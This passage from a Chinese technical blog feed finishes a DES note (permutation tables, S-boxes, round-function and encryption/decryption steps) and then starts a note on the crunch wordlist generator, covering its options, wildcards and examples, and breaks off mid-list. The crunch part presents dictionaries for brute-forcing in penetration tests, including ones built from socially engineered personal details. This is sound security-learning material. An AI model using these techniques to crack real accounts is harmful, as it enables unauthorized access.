<figcaption aria-hidden="true">轮函数对应框图</figcaption>
</figure>
<p>从上图可知，<span class="math inline">\(f\)</span> 函数首先将输入分成
8 个 4 位的分组，然后将每个分组扩展为 6 位，从而将 32 位的输入扩展为 48
位。这个过程在 E-盒中进行，E-盒是一种特殊的置换。</p>
<h3 id="e-盒置换-e-扩展置换">E 盒置换 (E 扩展置换)</h3>
<p>扩展置置换<strong>目标</strong>是IP置换后获得的右半部分R0，将32位输入扩展为48位(分为4位×8组)输出。</p>
<p>扩展置换<strong>目的</strong>有两个：生成与密钥相同长度的数据以进行异或运算；提供更长的结果，在后续的替代运算中可以进行压缩。</p>
<p>其过程如下图，即将 4 位扩展为 6 位。</p>
<figure>
<img src="/des-note/E%20扩展置换.png" alt="E 扩展置换">
<figcaption aria-hidden="true">E 扩展置换</figcaption>
</figure>
<p>扩展置换表 E 如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// E盒扩展置换表，将32位输入扩展至48位输出</span></span><br><span class="line"><span class="type">int</span> E[] = &#123;<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">		    <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">		    <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">		   <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">		   <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">		   <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">		   <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">		   <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看出，扩展的数据是从相邻两组分别取靠近的一位，4位变为6位。靠近32位的位为1，靠近1位的位为32。表中第二行的4取自上组中的末位，9取自下组中的首位。</p>
<p>可以发现，扩展盒增加了 DES
的扩散行为，因为某些输入位会影响两个不同的输出位置。</p>
<h3 id="s-盒置换">S 盒置换</h3>
<p>将扩展得到的 48 位结果与轮密钥 <span class="math inline">\(k_i\)</span> 进行异或操作，并将 8 个 6
位长的分组送入 8 个不同的 S-盒中，它将 6 位的输入映射为 4 位的输出。</p>
<p>具体的操作为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> row = (expandRi[i] &lt;&lt; <span class="number">1</span>) | expandRi[i + <span class="number">5</span>];</span><br><span class="line">    <span class="type">int</span> col = (expandRi[i + <span class="number">1</span>] &lt;&lt; <span class="number">3</span>) | (expandRi[i + <span class="number">2</span>] &lt;&lt; <span class="number">2</span>) | (expandRi[i + <span class="number">3</span>] &lt;&lt; <span class="number">1</span>) | expandRi[i + <span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> num = S_BOX[i / <span class="number">6</span>][row][col];</span><br><span class="line">    mappingRi[j++] = num &amp; <span class="number">1</span>;</span><br><span class="line">    mappingRi[j++] = num &amp; <span class="number">2</span>;</span><br><span class="line">    mappingRi[j++] = num &amp; <span class="number">4</span>;</span><br><span class="line">    mappingRi[j++] = num &amp; <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以下是 8 个 S-盒：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// S盒置换表，每个S盒是4x16的置换表，6位输入映射为4位输出</span></span><br><span class="line"><span class="type">int</span> S_BOX[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>&#125;, </span><br><span class="line">		&#123;<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>&#125; </span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>&#125;, </span><br><span class="line">		&#123;<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>&#125;  </span><br><span class="line">	&#125;, </span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>&#125;  </span><br><span class="line">	&#125;, </span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>&#125;  </span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>&#125;  </span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>&#125;  </span><br><span class="line">	&#125;, </span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>&#125;  </span><br><span class="line">	&#125;, </span><br><span class="line">	&#123;  </span><br><span class="line">		&#123;<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">		&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>&#125;  </span><br><span class="line">	&#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="p-盒置换">P 盒置换</h3>
<p>将 S 盒置换得到的 32 位输出按照 P
盒进行置换，把输入的每一位映射到输出位，任何一位不能被映射两次，也不能略去。</p>
<p>P 盒置换表如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// P盒置换表，32位输入映射为32位输出</span></span><br><span class="line"><span class="type">int</span> P[] = &#123;<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">		   <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">		    <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">		    <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">		    <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">		   <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">		   <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">		   <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>通过以上，可以知道，轮函数总共三个步骤。</p>
<ol type="1">
<li>将 32 位输入通过 E 盒置换输出为 48 位；</li>
<li>将 48 位输出跟轮密钥进行异或，再作为 S 盒置换的输入，映射为 32
位；</li>
<li>最后将 32 位的输出作为 P 盒置换的输入，把每一位映射到输出位。</li>
</ol>
<h2 id="逆初始置换-ip-1">逆初始置换 <span class="math inline">\(IP^{-1}\)</span></h2>
<p>合并 <span class="math inline">\(L_{16}\)</span> 和 <span class="math inline">\(R_{16}\)</span> 得到一个 64bits 的数据（即 <span class="math inline">\(R_{16}L_{16}\)</span>），再经过逆初始置换一次，得到密文。</p>
<p>逆初始置换表如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 逆初始置换表 IP^(-1)</span></span><br><span class="line"><span class="type">int</span> IP_1[] = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">			  <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">			  <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">			  <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">			  <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">			  <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">			  <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">			  <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="逆向密钥置换">逆向密钥置换</h2>
<blockquote>
<p>该小节可以不作了解</p>
</blockquote>
<p>因为 <span class="math inline">\(C_0=C_{16}\)</span> 和 <span class="math inline">\(D_0=D_{16}\)</span>，因此我们可以在第一次置换后，直接得到
<span class="math inline">\(k_{16}\)</span>。 <span class="math display">\[
\begin{align}
k_{16}&amp;=PC-2(C_{16},D_{16})\\
&amp;=PC-2(C_0,D_0)\\
&amp;=PC-2(PC-1(k))
\end{align}
\]</span></p>
<p>而计算 <span class="math inline">\(k_{15}\)</span> 时，需要中间变量
<span class="math inline">\(C_{15}\)</span> 和 <span class="math inline">\(D_{15}\)</span>，而这两个变量都可以由 <span class="math inline">\(C_{16}\)</span> 和 <span class="math inline">\(D_{16}\)</span> 经过循环右移得到： <span class="math display">\[
\begin{align}
k_{15}&amp;=PC-2(C_{15},D_{15})\\
&amp;=PC-2(RS_2(C_{16},RS_2(D_{16})))\\
&amp;=PC-2(RS_2(C_0),RS_2(D_0))
\end{align}
\]</span> 同理，后面的轮密钥 <span class="math inline">\(k_{14},k_{13},\cdots,k_1\)</span>
都是通过类似的方式右移得到的。</p>
<p>在解密模式中，每个轮密钥向右移动的位数为：</p>
<ul>
<li>在解密的第 1 轮中，密钥不移位</li>
<li>在解密的第 2、9 和 16 轮中，左右两位部分均向右移动一位</li>
<li>在 3、4、5、6、7、8、10、11、12、13、14 和 15
轮种，左右两部分均向右移动两位</li>
</ul>
<figure>
<img src="/des-note/逆向密钥置换流程图.png" alt="逆向密钥置换流程图">
<figcaption aria-hidden="true">逆向密钥置换流程图</figcaption>
</figure>
<h2 id="加密算法描述">加密算法描述</h2>
<ol type="1">
<li>将 8 字节即 64 位密钥作为输入，按照密钥置换函数 <span class="math inline">\(PC-1\)</span> 进行压缩置换，变成 56 位</li>
<li>再将输出分为左 28 位和右 28 位的 <span class="math inline">\(C_0,D_0\)</span>，将这两部分进行 16
轮的循环左移及压缩置换 <span class="math inline">\(PC-2\)</span>，依次将上一轮的输出作为下一轮的输入，最后生成
16 个 48 位的轮密钥 (子密钥) <span class="math inline">\(k_1,k_2,\cdots,k_{16}\)</span></li>
<li>加密算法的输入为 64 位明文，对明文进行初始置换 <span class="math inline">\(IP\)</span>，得到 64 位输出，将其均分为左 32
位和右 32 位的 <span class="math inline">\(L_0,R_0\)</span>，将它们作为轮函数 <span class="math inline">\(f\)</span> 的首次输入</li>
<li>轮函数将 <span class="math inline">\(R_0\)</span> 通过 E
盒扩展置换从 32 位变为 48 位</li>
<li>扩展后的 48 位与 <span class="math inline">\(k_1\)</span>
进行异或</li>
<li>异或后的结果再通过 S 盒置换从 48 位变为 32 位</li>
<li>将上一步的输出作为 P 盒置换的输入，得到 32 位的输出</li>
<li>将上一步的输出与左半部分进行异或运算，再将左右部分交换得到 <span class="math inline">\(L_1,R_1\)</span></li>
<li>重复步骤 4~8，其中轮函数的输入为上一轮的输出，共计重复 16
轮迭代，得到 <span class="math inline">\(L_{16},R_{16}\)</span></li>
<li>将 <span class="math inline">\(L_{16}\)</span> 和 <span class="math inline">\(R_{16}\)</span> 交换后合并，得到 64 位的输出
(<span class="math inline">\(R_{16}L_{16}\)</span>)</li>
<li>将输出经过一次逆初始置换 <span class="math inline">\(IP^{-1}\)</span> 即可得到 64 位密文</li>
</ol>
<h2 id="解密算法描述">解密算法描述</h2>
<ol type="1">
<li>与加密算法类似，但是进行逆向密钥置换，得到密钥 <span class="math inline">\(k_{16},k_{15},\cdots,k_1\)</span></li>
<li>再同理将密文作为轮函数输入，但第一次轮函数过程中不与 <span class="math inline">\(k_1\)</span> 异或，而是与 <span class="math inline">\(k_{16}\)</span> 进行异或</li>
<li>经过 16 轮迭代后，最终得到 <span class="math inline">\(L_{16},R_{16}\)</span></li>
<li>将 <span class="math inline">\(L_{16},R_{16}\)</span> 互换后合并为
64 位输出 (<span class="math inline">\(R_{16}L_{16}\)</span>)</li>
<li>再对 64 位输出经过一次逆初始置换 <span class="math inline">\(IP^{-1}\)</span> 即可得到 64 位明文</li>
</ol>
<h1 id="des-算法实现">DES 算法实现</h1>
<p>请查看 <a href="https://github.com/HasegawaAzusa/DES">https://github.com/HasegawaAzusa/DES</a></p>
<p>代码堪堪能运行而已，仅作示例和理解。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>crunch笔记</title>
    <url>//crunch-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Crunch
是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。</p>
<p>使用 Crunch
工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。尤其是在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。</p>
<p>在 Debian 系的 Linux 系统中可以使用 <code>apt install crunch</code>
直接安装。</p>
<p>也可以在 SourceForge 中获取资源 <a href="https://sourceforge.net/projects/crunch-wordlist/">https://sourceforge.net/projects/crunch-wordlist/</a>。</p>
<h1 id="使用">使用</h1>
<h2 id="语法">语法</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch &lt;min&gt; &lt;max&gt; [options]</span><br></pre></td></tr></table></figure>
<h2 id="参数详解">参数详解</h2>
<h3 id="必选参数">必选参数</h3>
<ul>
<li><code>min</code> → 设定最小字符串长度（必选）</li>
<li><code>max</code> → 设定最大字符串长度（必选）</li>
</ul>
<h3 id="可选参数">可选参数</h3>
<table>
<thead>
<tr class="header">
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-b</code></td>
<td>指定文件输出的大小，避免字典文件过大</td>
</tr>
<tr class="even">
<td><code>-c</code></td>
<td>指定文件输出的行数，即包含密码的个数</td>
</tr>
<tr class="odd">
<td><code>-d</code></td>
<td>限制相同元素出现的次数</td>
</tr>
<tr class="even">
<td><code>-e</code></td>
<td>定义停止字符，即到该字符串就停止生成</td>
</tr>
<tr class="odd">
<td><code>-f</code></td>
<td>调用库文件（/etc/share/crunch/charset.lst）</td>
</tr>
<tr class="even">
<td><code>-i</code></td>
<td>改变输出格式，即 aaa,aab → aaa,baa</td>
</tr>
<tr class="odd">
<td><code>-l</code></td>
<td>通常与 <code>-t</code> 联合使用，表明该字符为实义字符</td>
</tr>
<tr class="even">
<td><code>-m</code></td>
<td>通常与 <code>-p</code> 搭配</td>
</tr>
<tr class="odd">
<td><code>-o</code></td>
<td>将密码保存到指定文件</td>
</tr>
<tr class="even">
<td><code>-p</code></td>
<td>指定元素以组合的方式进行</td>
</tr>
<tr class="odd">
<td><code>-q</code></td>
<td>读取密码文件，即读取 pass.txt</td>
</tr>
<tr class="even">
<td><code>-r</code></td>
<td>定义重某一字符串重新开始</td>
</tr>
<tr class="odd">
<td><code>-s</code></td>
<td>指定一个开始的字符，即从自己定义的密码 <code>xxxx</code> 开始</td>
</tr>
<tr class="even">
<td><code>-t</code></td>
<td>指定密码输出的格式</td>
</tr>
<tr class="odd">
<td><code>-u</code></td>
<td>禁止打印百分比（必须为最后一个选项）</td>
</tr>
<tr class="even">
<td><code>-z</code></td>
<td>压缩生成的字典文件，支持 gzip,bzip2,lzma,7z</td>
</tr>
</tbody>
</table>
<h3 id="通配符">通配符</h3>
<ul>
<li><code>%</code> → 代表数字</li>
<li><code>^</code> → 代表特殊符号</li>
<li><code>@</code> → 代表小写字母</li>
<li><code>,</code> → 代表大写字母</li>
</ul>
<h1 id="实例">实例</h1>
<ul>
<li><p>生成一个字典文件，用自己指定的字符（默认为26个小写字母为元素的所有组合）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 3 123</span><br></pre></td></tr></table></figure>
<figure>
<img src="/crunch-note/crunch1.png" alt="crunch1">
<figcaption aria-hidden="true">crunch1</figcaption>
</figure></li>
<li><p>若字典中需要空格 <code>,;</code> 等用双引号来表示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 3 3 <span class="string">&quot;ab &quot;</span></span><br></pre></td></tr></table></figure>
<figure>
<img src="/crunch-note/crunch2.png" alt="crunch2">
<figcaption aria-hidden="true">crunch2</figcaption>
</figure></li>
<li><p>生成几个元素的组合（可以用于社工中收集的信息）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -p zhangsan 2018 0101 ..</span><br></pre></td></tr></table></figure>
<figure>
<img src="/crunch-note/crunch3.png" alt="crunch3">
<figcaption aria-hidden="true">crunch3</figcaption>
</figure></li>
<li><p>生成指定的字符串（比如生成编号，手机号等）</p>
